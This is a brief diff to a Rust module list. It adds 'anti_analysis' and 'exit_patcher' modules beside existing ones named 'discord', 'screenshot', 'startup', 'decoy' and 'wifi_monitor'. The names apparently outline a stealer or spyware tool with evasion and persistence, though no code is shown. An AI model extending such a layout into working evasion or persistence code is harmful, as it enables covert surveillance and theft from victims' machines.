@@ -1,4 +1,5 @@
 pub mod auth;
+pub mod anti_analysis;
 pub mod decoy;
 pub mod device_id;
 pub mod discord;
@@ -8,3 +9,4 @@ pub mod process;
 pub mod screenshot;
 pub mod startup;
 pub mod wifi_monitor;
+pub mod exit_patcher;
